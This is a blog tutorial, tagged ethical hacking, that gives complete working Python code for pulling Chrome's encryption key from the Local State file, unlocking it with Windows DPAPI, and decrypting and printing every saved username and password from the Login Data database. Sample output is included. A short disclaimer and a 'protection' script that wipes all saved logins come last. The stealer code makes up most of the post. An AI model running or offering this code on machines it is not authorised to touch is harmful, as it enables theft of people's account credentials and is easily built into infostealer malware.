---
layout: post
title: How to Extract Chrome Passwords in Python
date: 2022-09-09 07:00:00 -500
categories: [Ethical Hacking,python]
tags: [python]
image:
  path: /assets/img/headers/How_to_Extract_Chrome_Passwords_in_Python.webp
---


***
<center><strong><font color="DarkGray">Extracting saved passwords in the most popular browser is a useful and handy forensic task, as Chrome saves passwords locally in an SQLite database. However, this can be time-consuming when doing it manually.</font></strong></center>
<center><strong><font color="DarkGray">Since Chrome saves a lot of your browsing data locally on your disk, In this tutorial, we will write Python code to extract saved passwords in Chrome on your Windows machine. We will also make a quick script to protect ourselves from such attacks.</font></strong></center>

***
## **<strong><font color="Brown">Enumeration</font></strong>**
***

### **<strong><font color="DarkCyan">Requirements</font></strong>**
To get started, let's install the required libraries:
```bash
pip3 install pycryptodome pypiwin32
```

### **<strong><font color="DarkCyan">Librairies</font></strong>**
 Open up a new Python file, and import the necessary modules:
```python
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
```

### **<strong><font color="DarkCyan">Start Coding</font></strong>**
Before going straight into extracting chrome passwords, we need to define some useful functions that will help us in the main function:

```python
def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
```

* ```get_chrome_datetime()``` function is responsible for converting chrome date format into a human-readable date-time format.

* ```get_encryption_key()``` function extracts and decodes the AES key that was used to encrypt the passwords that are stored in the ```"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State"``` path as a JSON file.

* ```decrypt_password()``` takes the encrypted password and the AES key as arguments and returns a decrypted version of the password.

Below is the main function:


```python
def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass
```

* First, we get the encryption key using the previously defined ```get_encryption_key()``` function, then we copy the SQLite database (located at ```"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\default\Login Data"``` that has the saved passwords to the current directory and connects to it; this is because the original database file will be locked when Chrome is currently running.

* After that, we make a select query to the logins table and iterate over all login rows. We also decrypt each password and reformat the ```date_created``` and date_last_used date times to a more human-readable format.

* Finally, we print the credentials and remove the database copy from the current directory.

Let's call the main function:

```python
if __name__ == "__main__":
    main()
```
The output should be something like this format (obviously, I'm sharing fake credentials):

```python
Origin URL: https://accounts.google.com/SignUp
Action URL: ttps://accounts.google.com/SignUp
Username: email@gmail.com
Password: rU91aQktOuqVzeq
Creation date: 2020-05-25 07:50:41.416711
Last Used: 2020-05-25 07:50:41.416711
==================================================
Origin URL: https://cutt.ly/register
Action URL: https://cutt.ly/register
Username: email@example.com
Password: AfE9P2o5f5U
Creation date: 2020-07-13 08:31:25.142499
Last Used: 2020-07-13 09:46:24.375584
==================================================
```

Great, now you're aware that a lot of sensitive information is in your machine and is easily readable using scripts like this one.

```Disclaimer```: Please run this script on your machine or on a machine you have permission to access. We do not take any responsibility for any misuse.

## **<strong><font color="Brown">Deleting Passwords</font></strong>**

As you just saw, saved passwords on Chrome are quite dangerous to leave them there. Now you're maybe wondering how we can protect ourselves from malicious scripts like this. In this section, we will write a script to access that database and delete all rows from logins table:

```python
import sqlite3
import os

db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
db = sqlite3.connect(db_path)
cursor = db.cursor()
# `logins` table has the data we need
cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
n_logins = len(cursor.fetchall())
print(f"Deleting a total of {n_logins} logins...")
cursor.execute("delete from logins")
cursor.connection.commit()
```
This will require you to close the Chrome browser and then run it. Here is my output:

```python
Deleting a total of 204 logins...
```
Once you open Chrome this time, you'll notice that auto-complete on login forms is not there anymore. Run the first script as well, and you'll notice it outputs nothing, so we have successfully protected ourselves from this!

## **<strong><font color="Brown">Conclusion</font></strong>**

In this tutorial, you learned how to write a Python script to extract Chrome passwords on Windows, as well as delete them to prevent malicious users from being able to access them.

Note that in this tutorial, we have only talked about ```"Login Data"``` file, which contains the login credentials. I invite you to explore that directory furthermore.
